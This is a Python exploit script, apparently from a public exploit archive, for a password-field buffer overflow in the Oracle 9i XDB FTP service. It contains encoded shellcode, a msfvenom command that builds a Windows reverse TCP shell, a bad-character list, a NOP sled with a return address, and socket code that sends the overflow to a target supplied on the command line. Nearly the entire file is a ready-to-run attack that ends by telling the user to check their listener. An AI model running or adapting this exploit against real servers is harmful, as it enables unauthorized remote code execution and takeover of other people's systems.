#!/usr/bin/python
#author : davidlebr1
#Oracle 9i XDB (Windows x86) - FTP PASS Overflow  Python exploit
#http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf
#https://www.exploit-db.com/exploits/16731/

#usage : python exploit.py <target ip> <target port>

import socket, sys, random, string

rhost = sys.argv[1]
rport = int(sys.argv[2])

print "[*] Exploit generation"

#generate your shellcode and replace with the one below
#badchars : \x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40
#msfvenom -p windows/shell/reverse_tcp LHOST=<your ip> LPORT=<your port> -f python -b \x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40
buf =  ""
buf += "\x29\xc9\x83\xe9\xac\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x94\x99\xee\xb0\x83\xee\xfc\xe2\xf4\x68\x71"
buf += "\x6c\xb0\x94\x99\x8e\x39\x71\xa8\x2e\xd4\x1f\xc9\xde"
buf += "\x3b\xc6\x95\x65\xe2\x80\x12\x9c\x98\x9b\x2e\xa4\x96"
buf += "\xa5\x66\x42\x8c\xf5\xe5\xec\x9c\xb4\x58\x21\xbd\x95"
buf += "\x5e\x0c\x42\xc6\xce\x65\xe2\x84\x12\xa4\x8c\x1f\xd5"
buf += "\xff\xc8\x77\xd1\xef\x61\xc5\x12\xb7\x90\x95\x4a\x65"
buf += "\xf9\x8c\x7a\xd4\xf9\x1f\xad\x65\xb1\x42\xa8\x11\x1c"
buf += "\x55\x56\xe3\xb1\x53\xa1\x0e\xc5\x62\x9a\x93\x48\xaf"
buf += "\xe4\xca\xc5\x70\xc1\x65\xe8\xb0\x98\x3d\xd6\x1f\x95"
buf += "\xa5\x3b\xcc\x85\xef\x63\x1f\x9d\x65\xb1\x44\x10\xaa"
buf += "\x94\xb0\xc2\xb5\xd1\xcd\xc3\xbf\x4f\x74\xc6\xb1\xea"
buf += "\x1f\x8b\x05\x3d\xc9\xf1\xdd\x82\x94\x99\x86\xc7\xe7"
buf += "\xab\xb1\xe4\xfc\xd5\x99\x96\x93\x66\x3b\x08\x04\x98"
buf += "\xee\xb0\xbd\x5d\xba\xe0\xfc\xb0\x6e\xdb\x94\x66\x3b"
buf += "\xda\x9e\xf1\xe4\xbb\x94\x02\x86\xb2\x94\x88\xb2\x39"
buf += "\x72\xc9\xbe\xe0\xc4\xd9\xbe\xf0\xc4\xf1\x04\xbf\x4b"
buf += "\x79\x11\x65\x03\xf3\xfe\xe6\xc3\xf1\x77\x15\xe0\xf8"
buf += "\x11\x65\x11\x59\x9a\xba\x6b\xd7\xe6\xc5\x78\x71\x8f"
buf += "\xb0\x94\x99\x84\xb0\xfe\x9d\xb8\xe7\xfc\x9b\x37\x78"
buf += "\xcb\x66\x3b\x33\x6c\x99\x90\x86\x1f\xaf\x84\xf0\xfc"
buf += "\x99\xfe\xb0\x94\xcf\x84\xb0\xfc\xc1\x4a\xe3\x71\x66"
buf += "\x3b\x23\xc7\xf3\xee\xe6\xc7\xce\x86\xb2\x4d\x51\xb1"
buf += "\x4f\x41\x1a\x16\xb0\xe9\xbb\xb6\xd8\x94\xd9\xee\xb0"
buf += "\xfe\x99\xbe\xd8\x9f\xb6\xe1\x80\x6b\x4c\xb9\xd8\xe1"
buf += "\xf7\xa3\xd1\x6b\x4c\xb0\xee\x6b\x95\xca\x59\xe5\x66"
buf += "\x11\x4f\x95\x5a\xc7\x76\xe1\x5e\x2d\x0b\x64\x2c\x4c"
buf += "\xe6\xfe\x99\xbd\x4f\x41\x99\xee\xb0"

space = 800
jmp_short = "\xEB\x06"
nops = "\x90"
ret = "\x46\x6d\x61\x60"
preprendEncoder = "\x81\xc4\xff\xef\xff\xff\x44"
user = ''.join(random.choice(string.uppercase) for x in range(10))
password = ''.join(random.choice(string.uppercase) for x in range(442)) + jmp_short

payload = nops * (space-len(buf)-len(preprendEncoder)) + preprendEncoder + buf
exploit = nops * 2 + ret + payload

print "[*] Trying to connect to the FTP server"
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((rhost, rport))
print "[+] Connected"
data = client.recv(1024)
client.send('USER ' + user + '\r\n')
print "[*] Sending the payload"
client.send('PASS ' + password + exploit + '\r\n')
client.close
print "[*] Finish, check your listener"
